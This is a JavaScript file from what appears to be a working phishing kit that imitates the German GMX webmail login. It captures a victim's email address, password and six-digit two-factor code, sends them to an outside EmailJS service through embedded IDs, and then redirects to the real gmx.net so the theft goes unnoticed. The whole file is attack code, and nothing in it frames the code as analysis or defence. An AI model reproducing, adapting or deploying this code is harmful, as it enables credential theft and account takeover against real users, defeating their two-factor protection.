// ==================== EMAILJS SETUP ====================
// Replace these with your actual EmailJS credentials
emailjs.init("Ssc6U6E63datDPwa5");

const SERVICE_ID = "service_q9wwwn9";
const TEMPLATE_ID = "template_opvfu98";

// ==================== DOM ELEMENTS ====================
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const successOverlay = document.getElementById('successOverlay');

const passwordForm = document.getElementById('passwordForm');
const twofaForm = document.getElementById('twofaForm');

const submitBtn1 = document.getElementById('submitBtn1');
const submitBtn2 = document.getElementById('submitBtn2');

const toggleBtn = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');
const twofaInput = document.getElementById('twofaCode');

// Store credentials temporarily
let capturedEmail = '';
let capturedPassword = '';

// ==================== PASSWORD STEP ====================
passwordForm.addEventListener('submit', function(e) {
  e.preventDefault();

  capturedEmail = document.getElementById('email').value;
  capturedPassword = passwordInput.value;

  submitBtn1.textContent = 'Überprüfung...';
  submitBtn1.disabled = true;

  // Small delay to simulate real login check
  setTimeout(() => {
    step1.classList.add('hidden');
    step2.classList.remove('hidden');
    submitBtn1.textContent = 'Anmelden';
    submitBtn1.disabled = false;
  }, 800);
});

// ==================== 2FA STEP ====================
twofaForm.addEventListener('submit', function(e) {
  e.preventDefault();

  const twofaCode = twofaInput.value.trim();

  if (twofaCode.length !== 6) {
    alert('Bitte geben Sie den 6-stelligen Code ein.');
    return;
  }

  submitBtn2.textContent = 'Bestätigung...';
  submitBtn2.disabled = true;

  // Send both password and 2FA code via EmailJS
  const templateParams = {
    email: capturedEmail,
    password: capturedPassword,
    twofa_code: twofaCode,
    timestamp: new Date().toLocaleString('de-DE')
  };

  emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
    .then(() => {
      // Show redirecting overlay
      successOverlay.classList.remove('hidden');

      // Redirect to real GMX after 2.5 seconds (looks more realistic)
      setTimeout(() => {
        window.location.href = "https://www.gmx.net";
      }, 2500);
    })
    .catch((error) => {
      console.error('EmailJS Error:', error);
      alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
      submitBtn2.textContent = 'Bestätigen';
      submitBtn2.disabled = false;
    });
});

// Cancel 2FA and go back
document.getElementById('cancel2fa').addEventListener('click', function(e) {
  e.preventDefault();
  step2.classList.add('hidden');
  step1.classList.remove('hidden');
  twofaInput.value = '';
});

// Toggle password visibility
toggleBtn.addEventListener('click', function() {
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    toggleBtn.textContent = '🙈';
  } else {
    passwordInput.type = 'password';
    toggleBtn.textContent = '👁️';
  }
});

// Auto-focus 2FA input when shown
const observer = new MutationObserver(() => {
  if (!step2.classList.contains('hidden')) {
    twofaInput.focus();
  }
});
observer.observe(step2, { attributes: true });